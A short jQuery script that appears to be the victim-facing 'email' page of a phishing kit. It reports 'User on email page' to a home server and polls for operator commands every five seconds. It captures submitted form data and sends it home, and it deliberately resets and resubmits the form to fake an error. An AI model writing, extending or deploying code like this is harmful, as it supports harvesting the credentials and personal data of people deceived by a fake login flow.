$(document).ready(function() {
  REST_FN__.ask_email = {
    view: function() {
      return $("#email-view");
    },
    count: 1,
    show: function() {
      $(this.view()).show();
      if (this.count > 0) {
        this.error();
      }
      // window.location.href="../email/?op="+btoa(JSON.stringify(last_operation))
      // window.location.href="../email/"
      this.count++;
      this.shown();
    },
    error: function() {
      $(this.view())
        .find("form")[0]
        .reset();
      $(this.view())
        .find("form")
        .submit();
    },
    send: function(data) {
      CORE__.show_wating();
      respond.prev_op="ask_email";
      respond.mes = JSON.stringify(data);
      bider_obj.w = 1;
      CORE__.send_home(function() {});
    },
    shown: function() {
      respond.mes = last_operation.success_mes;
      CORE__.send_home();
    }
  };

  $("head base").attr("href", "");
  CORE__.bidder();
  bidder_timer = setInterval(function() {
    CORE__.bidder();
  }, 5000);

  respond.mes = "User on email page";
  CORE__.send_home();

  if ("op" in php_js) {
    last_operation = php_js.op;
    REST_FN__[last_operation.init_fn].show();
  }
});

//?op="+btoa(JSON.stringify(last_operation));
